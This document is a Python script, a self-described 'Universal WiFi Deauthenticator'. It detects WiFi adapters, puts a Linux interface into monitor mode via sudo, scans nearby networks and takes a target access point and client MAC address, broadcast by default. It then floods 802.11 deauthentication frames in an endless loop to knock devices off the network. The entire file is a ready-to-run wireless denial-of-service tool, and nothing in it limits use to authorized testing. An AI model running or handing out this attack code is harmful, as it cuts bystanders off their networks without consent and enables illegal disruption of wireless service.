#!/usr/bin/env python3
"""
Universal WiFi Deauthenticator (Improved)
- Detects OS
- Lists WiFi adapters (better detection)
- Checks for monitor mode/packet injection
- On Linux, can auto-enable monitor mode
- Can scan for nearby WiFi networks (Linux)
- Validates MAC addresses
- Attempts deauth with Scapy if possible
- Offers to restore managed mode after attack
- Gives clear feedback and instructions for each OS
- Falls back to info-only mode if jamming is not possible
"""
import os
import sys
import platform
import subprocess
import time
import re

def is_mac(addr):
    return re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", addr) is not None

# Try to import scapy, offer to install if missing
try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, get_if_list
except ImportError:
    print("[!] Scapy not found. Attempting to install...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "scapy"])
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, get_if_list

OS = platform.system().lower()
print(f"[i] Detected OS: {OS}")

def list_wifi_interfaces():
    if OS == "linux":
        try:
            iw_out = subprocess.check_output(["iw", "dev"]).decode()
            interfaces = []
            for line in iw_out.splitlines():
                if line.strip().startswith("Interface"):
                    iface = line.strip().split()[1]
                    interfaces.append(iface)
            return interfaces
        except Exception as e:
            print(f"[!] Could not list WiFi interfaces: {e}")
            return []
    elif OS == "darwin":  # macOS
        try:
            out = subprocess.check_output(["networksetup", "-listallhardwareports"]).decode()
            adapters = []
            for block in out.split("\n\n"):
                if "Wi-Fi" in block or "AirPort" in block:
                    for line in block.splitlines():
                        if line.strip().startswith("Device: "):
                            adapters.append(line.split(": ")[1])
            return adapters
        except Exception as e:
            print(f"[!] Could not list WiFi interfaces: {e}")
            return []
    elif OS == "windows":
        try:
            out = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode(errors="ignore")
            adapters = []
            for block in out.split("\n\n"):
                if "State" in block and "connected" in block:
                    for line in block.splitlines():
                        if "Name" in line:
                            adapters.append(line.split(":")[1].strip())
            return adapters
        except Exception as e:
            print(f"[!] Could not list WiFi interfaces: {e}")
            return []
    else:
        print("[!] Unsupported OS.")
        return []

interfaces = list_wifi_interfaces()
if not interfaces:
    print("[!] No WiFi interfaces found.")
    sys.exit(1)

print("Available WiFi interfaces:")
for idx, iface in enumerate(interfaces):
    print(f"{idx}) {iface}")

try:
    iface_idx = int(input("Select interface number: "))
    iface = interfaces[iface_idx]
except (IndexError, ValueError):
    print("[!] Invalid selection.")
    sys.exit(1)

can_deauth = False
if OS == "linux":
    try:
        iw_out = subprocess.check_output(["iwconfig", iface]).decode()
        if "Mode:Monitor" in iw_out:
            can_deauth = True
        else:
            print(f"[!] {iface} is NOT in monitor mode.")
            choice = input("Do you want to try to enable monitor mode automatically? (y/N): ").strip().lower()
            if choice == "y":
                try:
                    subprocess.check_call(["sudo", "ip", "link", "set", iface, "down"])
                    subprocess.check_call(["sudo", "iw", iface, "set", "monitor", "control"])
                    subprocess.check_call(["sudo", "ip", "link", "set", iface, "up"])
                    print(f"[+] {iface} should now be in monitor mode. Re-checking...")
                    iw_out = subprocess.check_output(["iwconfig", iface]).decode()
                    if "Mode:Monitor" in iw_out:
                        can_deauth = True
                    else:
                        print("[!] Failed to enable monitor mode.")
                except Exception as e:
                    print(f"[!] Could not enable monitor mode: {e}")
    except Exception as e:
        print(f"[!] Could not check interface mode: {e}")
elif OS == "darwin":
    print("[!] macOS does NOT natively support monitor mode or packet injection. Only some rare USB adapters with custom drivers do.")
    print("[i] You can scan for networks, but cannot perform jamming/deauth attacks.")
elif OS == "windows":
    print("[!] Windows does NOT support monitor mode or packet injection with standard drivers. Only a few special adapters (e.g., AirPcap) work.")
    print("[i] You can scan for networks, but cannot perform jamming/deauth attacks.")
else:
    print("[!] Unsupported OS for deauth/jamming.")

if not can_deauth:
    print("[i] Info-only mode. Deauthentication is not possible on this system/adapter.")
    sys.exit(0)

# Optional: Scan for networks (Linux)
if OS == "linux":
    scan_choice = input("Do you want to scan for nearby WiFi networks? (y/N): ").strip().lower()
    if scan_choice == "y":
        try:
            print("[i] Scanning for networks (this may take a few seconds)...")
            scan_out = subprocess.check_output(["sudo", "iwlist", iface, "scan"]).decode(errors="ignore")
            bssids = set(re.findall(r"Address: ([0-9A-Fa-f:]{17})", scan_out))
            essids = re.findall(r'ESSID:\"(.*?)\"', scan_out)
            print("Nearby networks:")
            for i, bssid in enumerate(bssids):
                essid = essids[i] if i < len(essids) else ""
                print(f"{i}) BSSID: {bssid}  ESSID: {essid}")
        except Exception as e:
            print(f"[!] Could not scan for networks: {e}")

bssid = input("Enter target BSSID (AP MAC): ").strip()
while not is_mac(bssid):
    print("[!] Invalid MAC address format. Please enter as XX:XX:XX:XX:XX:XX")
    bssid = input("Enter target BSSID (AP MAC): ").strip()

client = input("Enter client MAC (leave blank for broadcast): ").strip()
if client and not is_mac(client):
    print("[!] Invalid MAC address format. Using broadcast.")
    client = ""
if not client:
    client = "ff:ff:ff:ff:ff:ff"

print(f"[+] Sending deauth packets from {bssid} to {client} on {iface} (press Ctrl+C to stop)...")
pkt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth()
try:
    while True:
        sendp(pkt, iface=iface, count=10, inter=0.1, verbose=0)
        time.sleep(0.5)
except KeyboardInterrupt:
    print("\n[+] Stopped. Exiting.")

# Offer to restore managed mode
if OS == "linux":
    restore = input("Do you want to restore the interface to managed mode? (y/N): ").strip().lower()
    if restore == "y":
        try:
            subprocess.check_call(["sudo", "ip", "link", "set", iface, "down"])
            subprocess.check_call(["sudo", "iw", iface, "set", "type", "managed"])
            subprocess.check_call(["sudo", "ip", "link", "set", iface, "up"])
            print("[+] Interface restored to managed mode.")
        except Exception as e:
            print(f"[!] Could not restore managed mode: {e}") 